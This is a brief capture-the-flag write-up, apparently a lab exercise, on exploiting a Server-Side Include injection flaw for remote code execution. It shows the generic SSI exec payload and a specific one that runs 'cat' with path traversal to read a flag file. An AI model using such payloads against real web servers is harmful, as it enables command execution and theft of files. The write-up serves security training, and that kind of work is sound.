# SSI Injection

Exploit the SSI Injection vulnerability to obtain RCE and read the flag.

This exercise is pretty straightfoward, since we just have to adapt the exec command on the application.

```html
<!--#exec cmd="UNIX command" -->
```

<figure><img src="../../../.gitbook/assets/image (155).png" alt=""><figcaption></figcaption></figure>

```
<!--#exec cmd="cat ../../../flag.txt" -->
```

After looking into the directories we managed to get the flag with the command above!
